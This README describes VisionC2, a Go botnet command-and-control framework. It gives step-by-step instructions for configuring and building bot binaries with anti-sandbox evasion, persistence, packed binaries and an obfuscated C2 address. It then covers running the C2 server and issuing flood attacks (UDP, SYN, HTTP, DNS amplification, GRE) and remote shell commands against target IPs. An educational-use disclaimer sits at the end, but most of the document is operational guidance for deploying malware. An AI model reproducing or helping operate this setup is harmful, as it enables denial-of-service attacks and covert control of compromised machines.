# VisionC2 Go Based Botnet Command & Control (C2) Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is a Go-based Command & Control (C2) framework focused on Layer4/Layer7 floods and remote shell execution.  
It features TLS-encrypted communication, multi-architecture bot clients, and centralized management.

---

## ⚡ Features

### C2 Server

- **TLS Encryption** &mdash; Secure bot-to-server comms
- **Multi-User, Role-Based Auth** &mdash; Support for multiple admins or operators
- **Real-Time Bot Management** &mdash; Live monitoring and control
- **Centralized Attack Coordination** &mdash; Issue simultaneous commands to botnet clients
- **Persistence Handling** &mdash; Handles bot reconnections and state tracking

### Bot Client

- **14+ CPU Architectures Supported**
- **Anti-Sandboxing** &mdash; Multi-stage detection/evasion
- **Persistence Mechanisms** &mdash; Multi-layered survival techniques
- **Remote Shell Execution** &mdash; Detach, stream, or normal shell command execution
- **Attack Capabilities**:
  - UDP / TCP Flood
  - HTTP Flood
  - SYN / ACK Flood
  - DNS Amplification
  - GRE Flood

---

## 🔧 Prerequisites

### Requirements

- **Go 1.21+** (install for building from source)
- **UPX** &mdash; For compressing binaries
- **OpenSSL** &mdash; For TLS certificate creation
- **NoMoreUPX** (recommended) &mdash; [UPX string remover](https://github.com/Syn2Much/upx-stripper)

### Install Dependencies

#### Ubuntu / Debian

```bash
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git
```

#### CentOS / RHEL

```bash
sudo yum install -y golang upx openssl git
```

---

## 📜 TLS Certificate Setup

VisionC2 requires TLS certificates to secure bot communication.

### Option A: Self-Signed Certificate (For dev/testing)

```bash
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
chmod 600 server.key
chmod 644 server.crt
```

### Option B: Let’s Encrypt (Recommended for production)

```bash
sudo apt install certbot
sudo certbot certonly --standalone -d yourdomain.com
```

Certificates will be in:  
`/etc/letsencrypt/live/yourdomain.com/`

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
```

### 2. Configure the C2 Server

Edit `cnc/main.go` and set:

```go
const (
    USER_SERVER_IP   = "YOUR_SERVER_IP"
    BOT_SERVER_IP    = "YOUR_SERVER_IP"
    USER_SERVER_PORT = "420"
    BOT_SERVER_PORT  = "443"
)
```

Update protocol constants:

```go
const (
    MAGIC_CODE       = "CHANGE_ME"
    PROTOCOL_VERSION = "v1.0"
)
```

### 3. Configure the Bot

Edit `bot/main.go`:

```go
const gothTits = "OBFUSCATED_C2_STRING"
```

Generate the obfuscated string:

```bash
python3 tools/obfuscate_c2.py "YOUR_C2_IP:443"
```

Update both `gothTits` and `requestMore()` with the new string.

### 4. Build Bot Binaries

```bash
cd bot
chmod +x build.sh
./build.sh
```

### 5. Run the C2 Server

```bash
cd cnc
go run .
```

A default `users.json` will be created on first run.

### 6. Connect to the Admin Interface

```bash
nc YOUR_SERVER_IP 420
# or
telnet YOUR_SERVER_IP 420

enter "spamtec" to make login screen appear once connected //change this to secret key of choice 
```

---

## 🛠️ Admin Commands

### Bot Management

```
bots           # List bots
!info          # More info
!persist       # Persistence control
!reinstall     # Force reinstall
!lolnogtfo     # Remove/uninstall
```

### Attack Commands

```
!udpflood <ip> <port> <time>
!tcpflood <ip> <port> <time>
!http <ip> <port> <time>
!syn <ip> <port> <time>
!ack <ip> <port> <time>
!gre <ip> <port> <time>
!dns <ip> <port> <time>
```

### System / Shell

```
!shell <cmd>
!stream <cmd>
!detach <cmd>
clear   | cls
help    | ?
ongoing
logout  | exit
```

---

## ⚖️ Legal & Ethical Notice

This software is for **educational and authorized security research only**.

By using VisionC2 you agree to:

1. Obtain explicit permission before testing/deployment
2. Follow all applicable laws
3. Take full responsibility for any use of the code
4. Never use for malicious or unauthorized purposes

---

## 📧 Contact

[dev@sinners.city](mailto:dev@sinners.city)

---
